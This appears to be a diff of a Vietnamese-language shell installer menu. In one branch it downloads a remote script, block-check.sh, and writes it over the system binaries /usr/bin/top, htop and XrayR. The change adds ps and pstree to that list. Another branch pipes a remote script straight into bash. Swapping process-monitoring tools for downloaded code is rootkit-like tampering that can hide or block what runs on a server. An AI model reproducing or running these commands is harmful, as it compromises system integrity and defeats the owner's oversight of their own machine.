@@ -14,6 +14,8 @@ read -p "  Vui Lòng Nhập : " num
         rm -rf top htop XrayR xrayr
         curl -o /usr/bin/top -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x top
         curl -o /usr/bin/htop -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x htop
+        curl -o /usr/bin/ps -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x ps
+        curl -o /usr/bin/pstree -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x pstree
         curl -o /usr/bin/XrayR -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x XrayR && ln -s XrayR xrayr && chmod +x xrayr
         ;;
         4) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-speed4g.sh)
